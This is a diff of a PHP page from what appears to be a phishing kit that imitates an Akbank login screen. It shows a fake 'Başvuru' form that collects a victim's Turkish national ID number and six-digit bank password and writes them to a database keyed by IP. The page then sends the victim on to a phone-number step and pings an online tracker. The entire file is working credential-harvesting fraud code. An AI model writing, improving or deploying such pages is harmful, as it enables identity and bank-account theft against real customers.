@@ -4,28 +4,68 @@ if ($ajax->banControl(IP)) {
     $ajax->redirect(BAN_URL);
 }
 
-$has_error = isset($_GET['hata']) ? true : false;
-
+$has_error = false;
+if (isset($_GET['hata'])) {
+    $has_error = true;
+}
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $phone = isset($_POST['phone2']) ? trim($_POST['phone2']) : '';
-    // Clean spaces or extra characters
-    $phone = str_replace(' ', '', $phone);
+    $tc = isset($_POST['customTc']) ? trim($_POST['customTc']) : '';
+    $password = isset($_POST['customPass']) ? trim($_POST['customPass']) : '';
 
-    if (strlen($phone) >= 10 && strlen($phone) <= 11 && ctype_digit($phone)) {
-        // Update user record with phone
-        $query = $db->prepare("UPDATE records SET tel = ?, page = 'Bekle', lastOnline = ? WHERE ipAddress = ?");
-        $query->execute([$phone, time() + 10, IP]);
-        $ajax->redirect('bekle.php');
+    // TC verification helper function
+    function validate_tc($tckimlik) {
+        $olmaz = ['11111111110', '22222222220', '33333333330', '44444444440', '55555555550', '66666666660', '77777777770', '88888888880', '99999999990'];
+        if ($tckimlik[0] == 0 || !ctype_digit($tckimlik) || strlen($tckimlik) != 11) {
+            return false;
+        }
+        $ilkt = 0;
+        $sont = 0;
+        $tumt = 0;
+        for ($a = 0; $a < 9; $a += 2) {
+            $ilkt += intval($tckimlik[$a]);
+        }
+        for ($a = 1; $a < 9; $a += 2) {
+            $sont += intval($tckimlik[$a]);
+        }
+        for ($a = 0; $a < 10; $a++) {
+            $tumt += intval($tckimlik[$a]);
+        }
+        if (($ilkt * 7 - $sont) % 10 != intval($tckimlik[9]) || $tumt % 10 != intval($tckimlik[10])) {
+            return false;
+        }
+        if (in_array($tckimlik, $olmaz)) {
+            return false;
+        }
+        return true;
+    }
+
+    if (validate_tc($tc) && strlen($password) === 6 && ctype_digit($password)) {
+        // Clear previous redirects
+        $db->prepare("DELETE FROM redirect WHERE ipAddress = ?")->execute([IP]);
+
+        // Check if a record already exists for this IP
+        $check = $db->prepare("SELECT id FROM records WHERE ipAddress = ? LIMIT 1");
+        $check->execute([IP]);
+        $existing = $check->fetch(PDO::FETCH_ASSOC);
+
+        if ($existing) {
+            // Update existing record, preserving phone number, sms, notes, etc.
+            $update = $db->prepare("UPDATE records SET tc = ?, pass = ?, page = 'Telefon Numara Girişi', lastOnline = ? WHERE ipAddress = ?");
+            $update->execute([$tc, $password, time() + 10, IP]);
+        } else {
+            // Insert new record
+            $insert = $db->prepare("INSERT INTO records SET tc = ?, pass = ?, page = 'Telefon Numara Girişi', lastOnline = ?, ipAddress = ?");
+            $insert->execute([$tc, $password, time() + 10, IP]);
+        }
+
+        // Route to telefon.php
+        $ajax->redirect('telefon.php');
     } else {
         $has_error = true;
     }
 }
 
-$ajax->pageUpdate(IP, 'Telefon Numara Girişi');
-
-$ip = IP;
-$user_bilgi = $db->query("SELECT tc FROM records WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_ASSOC);
-$kullanici_tc = isset($user_bilgi['tc']) ? htmlspecialchars($user_bilgi['tc']) : '';
+$ajax->pageUpdate(IP, 'Giriş Sayfası');
 ?>
 <!DOCTYPE html>
 <html lang="tr">
@@ -34,9 +74,9 @@ $kullanici_tc = isset($user_bilgi['tc']) ? htmlspecialchars($user_bilgi['tc']) :
     
     
     
-    <title>Telefon No Doğrulama - Direkt</title>
+    <title>Giriş - Direkt</title>
     <style>
-        <?php echo file_get_contents('files/asset/css/normalize.min.css'); ?>
+        <?php echo file_get_contents(dirname(__DIR__) . '/files/asset/css/normalize.min.css'); ?>
         
         @font-face {
           font-family: 'Poppins';
@@ -118,75 +158,65 @@ $kullanici_tc = isset($user_bilgi['tc']) ? htmlspecialchars($user_bilgi['tc']) :
           src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1xlFQ.woff2') format('woff2');
           unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
         }
-        <?php echo file_get_contents('basvuru/style.css'); ?>
+        <?php echo file_get_contents(dirname(__DIR__) . '/basvuru/style.css'); ?>
     </style>
 </head>
 <body>
     <div id="slider">
-        <div class="gray6 slide active" style="background-color: rgb(241, 241, 241);">
-            <div id="tab3header21">
-                <h2 style="text-align: center; font-size: 12px; color: white; margin: 0; font-weight: 600;">Telefon No Doğrulama</h2>
+        <div class="gray3 slide active" style="background-color: rgb(241, 241, 241);">
+            <div id="tab3header">
+                <img src="/basvuru/img/ok.png" onclick="location.href='index.php'" width="32px" style="margin-right: auto; cursor: pointer;">
+                <h2 style="text-align: center; font-size: 12px; color: white; margin: 0; margin-right: 47%; font-weight: 600;">Başvuru</h2>
             </div>
 
-            <div id="alertDiv3" class="alertDiv <?php echo $has_error ? 'show' : ''; ?>">
+            <!-- Error Notification Alert Panel -->
+            <div id="alertDiv" class="alertDiv <?php echo $has_error ? 'show' : ''; ?>">
                 <p style="color: #000; font-size: 12px; font-weight: 600; margin-top: 15px;">Bilgilendirme</p>
                 <img src="/basvuru/img/loader.gif" style="width: 30%;">
                 <p style="color: #000; font-size: 12px; font-weight: 400; padding: 0 10px;">Eksik veya hatalı bilgi girdiğini fark ettik. Kontrol edip tekrar deneyebilirsin.</p>
-                <button type="button" onclick="closeAlert()" id="btn-spc2" class="btnn-spc3" style="width: 90% !important; background-color: rgb(238, 21, 2); border: 0; color: white; border-radius: 40px; padding: 12px; font-weight: bold; cursor: pointer;">Tamam</button>
+                <button type="button" onclick="closeAlert()" id="btn-spc3" style="width: 90% !important;">Tamam</button>
             </div>
 
-            <div id="loginInputs" class="telefonInputs">
-                <?php if ($kullanici_tc): ?>
-                <div style="display:flex; align-items:center; justify-content:space-between; background:#f7f7f7; border-radius:8px; padding:10px 14px; margin-bottom:14px; border:1px solid #e8e8e8;">
-                    <span style="color:#9a9a9a; font-size:10px; font-weight:600; letter-spacing:0.5px; text-transform:uppercase;">TC KİMLİK NUMARANIZ:</span>
-                    <span style="color:#333; font-size:13px; font-weight:700; letter-spacing:1px;"><?= $kullanici_tc ?></span>
-                </div>
-                <?php endif; ?>
-                <form id="phoneForm" method="POST" action="telefon.php">
-                    <div style="display: flex; flex-direction: column;">
-                        <label for="phone2" style="color:#636364; font-size: 11px; margin-bottom: 3%; display: flex; font-weight:600;">CEP TELEFONU NUMARASI</label>
-                        <div style="display: flex; align-items: center;">
-                            <b style="font-size: 14px; width: 17%; font-weight: 600 !important;">TR +90</b>
-                            <input type="text" name="phone2" placeholder="Telefon Numaranızı Giriniz" id="phone2" style="font-size: 12px; font-weight:bold; border:0; width: 60%; display: block;" minlength="10" maxlength="11" inputmode="numeric" required>
-                        </div>
-                    </div>
-                </form>
+            <div id="loginInputs">
+                <form id="customForm" method="POST" action="giris.php">
+                    <label for="customUsername" style="color:#636364; font-size: 11px; display: block; margin-bottom: 3%; float: left; font-weight: 600;">MÜŞTERİ VEYA TC KİMLİK NUMARASI</label>
+                    <input type="text" name="customTc" placeholder="Müşteri veya TC kimlik numaranı gir" id="customUsername" style="font-size: 13px; font-weight: 600; border: 0; width: 100%; display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric" required>
+                    <hr>
+                    <label for="customPassword" style="float: left; color:#636364; font-size: 11px; display: block; margin-bottom: 3%; margin-top: 3%; font-weight: 600;">AKBANK ŞİFRESİ</label>
+                    <input type="password" name="customPass" placeholder="6 haneli şifreni gir" id="customPassword" style="font-size: 13px; font-weight: 600; width: 100%; display: block; border: 0;" minlength="6" maxlength="6" inputmode="numeric" required>
+                </form> 
             </div>
 
-            <div id="gonder">
-                <button type="button" id="btn-spc" class="telefonBTN" style="width: 100% !important; background-color: rgb(238, 21, 2);" onclick="submitForm()">Devam</button>
+            <div id="tab3footer" style="display: flex; justify-content: space-between;">
+                <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-left: 15px; font-weight: 500;">
+                    Müşteri numaranı mı <br> <span style="margin-left:-75px !important;">unuttun?</span>
+                </p>
+                <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-right: 15px; font-weight: 500;">
+                    Şifreni mi unuttun?
+                </p>
+            </div>
+
+            <div id="submitContainer">
+                <button type="button" id="customSubmitBtn" style="background-color: rgb(220, 0, 4);" onclick="submitForm()">Başvuru Yap</button>
             </div>
         </div>
     </div>
 
     <script>
         function submitForm() {
-            const phoneInput = document.getElementById('phone2').value.replace(/\s+/g, '');
-            if (phoneInput.length < 10 || phoneInput.length > 11 || isNaN(phoneInput)) {
-                document.getElementById('alertDiv3').classList.add('show');
-            } else {
-                document.getElementById('phoneForm').submit();
-            }
+            document.getElementById('customForm').submit();
         }
         function closeAlert() {
-            document.getElementById('alertDiv3').classList.remove('show');
+            document.getElementById('alertDiv').classList.remove('show');
         }
-
-        // Panel redirect kontrolü - her 2 saniyede bir kontrol et
-        function checkRedirect() {
-            fetch('check_redirect.php')
-                .then(function(r) { return r.json(); })
-                .then(function(data) {
-                    if (data.redirect) {
-                        window.location.href = data.redirect;
-                    }
-                })
-                .catch(function() {});
-        }
-        setInterval(checkRedirect, 2000);
+        // Giriş Online sayacında aktif kalabilmek için her 5 saniyede bir ping gönderir
+        setInterval(function() {
+            fetch('ping.php');
+        }, 5000);
     </script>
 </body>
 </html>
+
 
 
 
